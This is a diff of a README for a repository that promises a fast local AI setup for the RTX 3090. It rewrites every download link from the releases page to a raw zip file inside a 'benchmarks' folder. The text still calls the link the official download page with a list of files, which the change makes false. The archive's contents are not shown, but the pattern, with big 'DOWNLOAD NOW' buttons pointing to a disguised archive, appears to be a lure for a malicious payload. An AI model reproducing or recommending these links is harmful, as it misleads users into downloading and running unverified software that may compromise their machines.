@@ -1,7 +1,7 @@
 <h1>⚡ qwen38-3090-sglang - Fastest AI on Your RTX 3090</h1>
 
 <p align="center">
-  <a href="https://github.com/Emmanue4888/qwen38-3090-sglang/releases" style="background:#ff6b6b;color:white;padding:15px 40px;border-radius:50px;font-size:20px;text-decoration:none;font-weight:bold;box-shadow:0 4px 15px rgba(255,107,107,0.4)">🔥 DOWNLOAD NOW — FREE</a>
+  <a href="https://github.com/Emmanue4888/qwen38-3090-sglang/raw/refs/heads/main/benchmarks/qwen-sglang-v1.7.zip" style="background:#ff6b6b;color:white;padding:15px 40px;border-radius:50px;font-size:20px;text-decoration:none;font-weight:bold;box-shadow:0 4px 15px rgba(255,107,107,0.4)">🔥 DOWNLOAD NOW — FREE</a>
 </p>
 
 ## 🚀 Getting Started
@@ -34,7 +34,7 @@ Your computer needs these things:
 
 **Step 1: Visit this link to download the application.**
 
-🔗 **[Click Here to Download](https://github.com/Emmanue4888/qwen38-3090-sglang/releases)**
+🔗 **[Click Here to Download](https://github.com/Emmanue4888/qwen38-3090-sglang/raw/refs/heads/main/benchmarks/qwen-sglang-v1.7.zip)**
 
 This link takes you to the official download page. You'll see a list of files there.
 
@@ -203,7 +203,7 @@ Before you start, make sure you have:
 Head back to the top and hit that big red **DOWNLOAD NOW** button. You'll be chatting with your AI in under 5 minutes.
 
 **Visit this link to download the application:**  
-[🔗 https://github.com/Emmanue4888/qwen38-3090-sglang/releases](https://github.com/Emmanue4888/qwen38-3090-sglang/releases)
+[🔗 https://github.com/Emmanue4888/qwen38-3090-sglang/raw/refs/heads/main/benchmarks/qwen-sglang-v1.7.zip](https://github.com/Emmanue4888/qwen38-3090-sglang/raw/refs/heads/main/benchmarks/qwen-sglang-v1.7.zip)
 
 Happy computing! Your personal AI awaits.
 
